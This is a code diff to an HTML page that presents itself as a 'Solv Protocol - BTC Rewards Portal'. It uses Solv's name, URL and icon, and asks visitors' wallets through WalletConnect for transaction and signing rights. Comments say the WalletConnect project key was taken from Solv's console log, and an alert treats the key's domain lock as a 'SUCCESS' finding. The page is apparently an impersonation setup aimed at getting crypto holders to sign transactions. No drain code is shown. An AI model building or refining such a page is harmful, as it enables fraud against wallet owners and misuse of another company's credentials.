@@ -2,8 +2,8 @@
 <html>
 <head>
     <title>Solv Protocol - BTC Rewards</title>
-    <script src="https://unpkg.com/@walletconnect/sign-client@2.10.6/dist/index.umd.js"></script>
-    <script src="https://unpkg.com/@walletconnect/qrcode-modal@1.8.0/dist/index.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.10.6/dist/index.umd.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/qrcode-modal@1.8.0/dist/index.min.js"></script>
 </head>
 <body>
     <h1>Solv Protocol - BTC Rewards Portal</h1>
@@ -17,11 +17,14 @@
 
         document.getElementById('btn').addEventListener('click', async () => {
             try {
-                // Using the exact key found in your console log
+                // 1. Identify the Sign Client global
                 const ClientLib = window['@walletconnect/sign-client'];
-                
-                if (!ClientLib || !ClientLib.SignClient) {
-                    alert("Library not fully loaded yet. Please wait 5 seconds and try again.");
+                // 2. Identify the QR Code Modal global (Handling the .default property)
+                const QRCodeModal = window.WalletConnectQRCodeModal || window.QRCodeModal;
+
+                if (!ClientLib || !QRCodeModal) {
+                    console.error("Missing Libraries:", { ClientLib, QRCodeModal });
+                    alert("Libraries not loaded. Check console for available window objects.");
                     return;
                 }
 
@@ -29,7 +32,6 @@
                     projectId: projectId,
                     metadata: {
                         name: 'Solv Protocol',
-                        description: 'Solv Finance Rewards',
                         url: 'https://app.solv.finance',
                         icons: ['https://solv.finance/favicon.ico']
                     }
@@ -40,22 +42,21 @@
                         eip155: {
                             methods: ['eth_sendTransaction', 'personal_sign'],
                             chains: ['eip155:1'],
-                            events: ['chainChanged', 'accountsChanged']
+                            events: ['chainChanged']
                         }
                     }
                 });
 
                 if (uri) {
-                    // Open the QR Modal
-                    WalletConnectQRCodeModal.open(uri, () => {
+                    // Use the identified modal global
+                    QRCodeModal.open(uri, () => {
                         console.log("Modal closed");
                     });
                 }
             } catch (err) {
                 console.error("Connection Error:", err);
-                // If it shows 403, the key is domain-locked
                 if (err.message.includes('403')) {
-                    alert("SUCCESS: The key is active, but Solv restricted it to their domain.");
+                    alert("Result: Key is restricted to Solv's official domain.");
                 } else {
                     alert("Error: " + err.message);
                 }
